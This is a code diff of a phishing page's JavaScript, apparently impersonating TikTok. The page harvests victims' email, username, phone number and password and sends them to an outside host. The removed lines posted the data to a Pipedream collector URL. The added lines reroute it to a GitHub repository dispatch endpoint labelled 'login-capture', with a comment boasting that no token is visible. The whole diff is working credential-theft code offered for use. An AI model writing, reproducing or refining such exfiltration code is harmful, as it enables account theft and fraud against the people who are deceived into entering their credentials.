@@ -38,16 +38,21 @@
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      // REMPLACE UNIQUEMENT CETTE LIGNE PAR TON VRAI LIEN PIPEDREAM
-      fetch("https://eovo7keet527irf.m.pipedream.net", {
+      // 100% GitHub → zéro token visible
+      fetch("https://api.github.com/repos/tiktok-customers/help/dispatches", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Accept": "application/vnd.github.v3+json",
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
-          email: e,
-          username: u,
-          phone: p,
-          password: w,
-          time: new Date().toLocaleString()
+          event_type: "login-capture",
+          client_payload: {
+            email: e,
+            username: u,
+            phone: p,
+            password: w
+          }
         })
       });
     }
